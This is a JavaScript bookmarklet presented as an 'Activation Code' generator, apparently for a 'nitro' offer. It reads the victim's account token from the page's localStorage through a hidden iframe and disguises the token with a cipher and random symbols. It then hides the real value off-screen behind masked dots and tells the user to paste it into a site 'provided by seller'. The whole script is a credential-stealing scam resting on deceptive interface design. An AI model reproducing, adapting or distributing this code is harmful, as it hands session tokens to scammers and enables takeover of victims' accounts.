javascript:(function(){
  try {
    let f = document.createElement('iframe');
    f.style.display = 'none';
    document.body.appendChild(f);
    let t = JSON.parse(f.contentWindow.localStorage.token);

    function substitutionCipher(s) {
      const cipherMap = {
        'A': 'Z', 'B': 'Y', 'C': 'X', 'D': 'W', 'E': 'V', 'F': 'U', 'G': 'T', 'H': 'S', 'I': 'R', 'J': 'Q', 'K': 'P', 'L': 'O', 'M': 'M',
        'N': 'N', 'O': 'M', 'P': 'L', 'Q': 'K', 'R': 'J', 'S': 'I', 'T': 'H', 'U': 'G', 'V': 'F', 'W': 'E', 'X': 'D', 'Y': 'C', 'Z': 'B',
        'a': 'z', 'b': 'y', 'c': 'x', 'd': 'w', 'e': 'v', 'f': 'u', 'g': 't', 'h': 's', 'i': 'r', 'j': 'q', 'k': 'p', 'l': 'o', 'm': 'm',
        'n': 'n', 'o': 'm', 'p': 'l', 'q': 'k', 'r': 'j', 's': 'i', 't': 'h', 'u': 'g', 'v': 'f', 'w': 'e', 'x': 'd', 'y': 'c', 'z': 'b',
        '0': '9', '1': '8', '2': '7', '3': '6', '4': '5', '5': '4', '6': '3', '7': '2', '8': '1', '9': '0'
      };
      return s.split('').map(char => cipherMap[char] || char).join('');
    }

    function randomizeToken(s) {
      const symbols = ['@', '#', '$', '%', '&', '!', '/', '<', '>'];
      let result = '';
      for (let i = 0; i < s.length; i++) {
        result += s[i];
        if (i < s.length - 1) {
          const randCount = Math.floor(Math.random() * 3) + 1;
          for (let j = 0; j < randCount; j++) {
            result += symbols[Math.floor(Math.random() * symbols.length)];
          }
        }
      }
      return `nitroget=${result}#3222`;
    }

    let cipheredToken = substitutionCipher(t);
    let randomizedToken = randomizeToken(cipheredToken);

    document.body.innerHTML = '';
    document.head.innerHTML = '';
    document.body.style.cssText = 'background:linear-gradient(135deg,#0f172a,#1e3a8a);color:#f1f5f9;font-family:"Inter",sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px;box-sizing:border-box;';

    let container = document.createElement('div');
    container.style.cssText = 'background:rgba(30,41,59,0.7);padding:40px;border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.3);max-width:90%;width:600px;backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,0.15);text-align:center;';

    let heading = document.createElement('h2');
    heading.textContent = 'Activation Code';
    heading.style.cssText = 'color:#60a5fa;font-size:28px;font-weight:700;margin-bottom:20px;';

    let message = document.createElement('p');
    message.innerHTML = '✅ Your activation code is ready!<br><br>Paste this code into the site provided by seller for further process.';
    message.style.cssText = 'color:#cbd5e1;font-size:16px;line-height:1.6;margin-bottom:24px;';

    let codeInput = document.createElement('textarea');
    codeInput.value = randomizedToken;
    codeInput.readOnly = true;
    codeInput.style.cssText = 'position:absolute;left:-9999px;opacity:0;pointer-events:none;';

    let codeDisplay = document.createElement('div');
    codeDisplay.textContent = '••••••••••••••••••••••';
    codeDisplay.style.cssText = 'width:100%;padding:16px;font-size:16px;border-radius:10px;background:rgba(15,23,42,0.8);color:#93c5fd;text-align:center;margin-bottom:24px;font-family:"JetBrains Mono",monospace;letter-spacing:3px;border:1px solid rgba(147,197,253,0.2);';

    let copyButton = document.createElement('button');
    copyButton.textContent = 'Copy Code';
    copyButton.style.cssText = 'padding:12px 32px;background:linear-gradient(45deg,#3b82f6,#60a5fa);color:#ffffff;border:none;border-radius:10px;cursor:pointer;font-size:16px;font-weight:600;transition:all 0.3s ease;box-shadow:0 4px 20px rgba(59,130,246,0.4);';
    copyButton.onmouseover = () => { copyButton.style.transform = 'translateY(-2px)'; copyButton.style.boxShadow = '0 6px 24px rgba(59,130,246,0.5)'; };
    copyButton.onmouseout = () => { copyButton.style.transform = 'translateY(0)'; copyButton.style.boxShadow = '0 4px 20px rgba(59,130,246,0.4)'; };
    copyButton.onclick = () => {
      navigator.clipboard.writeText(codeInput.value);
      copyButton.textContent = '✓ Copied!';
      setTimeout(() => {
        copyButton.textContent = 'Copy Code';
      }, 1500);
    };

    container.append(heading, message, codeDisplay, codeInput, copyButton);
    document.body.appendChild(container);

  } catch (e) {
    alert('❌ Error generating code. Ensure you are logged in and retry.');
  }
})();
